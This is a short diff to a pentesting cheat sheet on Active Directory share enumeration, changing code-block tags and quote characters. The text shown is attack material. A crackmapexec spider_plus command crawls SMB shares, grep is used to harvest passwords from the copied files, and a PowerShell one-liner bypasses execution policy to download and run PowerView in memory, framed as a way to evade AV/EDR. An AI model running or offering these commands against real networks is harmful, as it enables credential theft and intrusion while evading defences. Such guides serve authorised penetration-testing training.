@@ -29,19 +29,19 @@ crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=f
 ```
 
 This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc ..
-```markdown
-grep -rnw ./ -e ‘password’
+```bash
+grep -rnw ./ -e 'password'
 ```
 
 If CME is detected by AV/EDR, use PowerShell one-liner PowerView :
 
-```markdown
+```powershell
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
 ```
 
 Then, a lot of functionalities can be used. To find all domain shares :
 
-```markdown
+```powershell
 Find-DomainShare -CheckShareAccess
 ```
 
